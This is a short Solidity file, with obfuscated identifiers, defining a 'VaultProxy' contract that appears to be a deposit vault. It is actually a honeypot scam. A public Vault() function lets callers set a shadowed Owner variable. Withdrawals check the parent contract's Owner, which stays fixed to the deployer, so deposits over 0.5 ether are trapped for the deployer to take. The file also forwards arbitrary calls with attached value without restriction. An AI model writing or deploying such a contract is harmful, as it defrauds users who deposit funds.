pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0x08047c { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x797e92(address _0x6985c0) public _0x08047c { Owner = _0x6985c0; }
    function _0x1c8b3d(address _0xf4879e, bytes data) public payable {
        _0xf4879e.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            _0xf655a9();
        }
    }

    function _0xf655a9() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0xbffe6e(uint256 _0x6fd720) public _0x08047c {
        if (_0x6fd720>0 && Deposits[msg.sender]>=_0x6fd720) {
            msg.sender.transfer(_0x6fd720);
        }
    }
}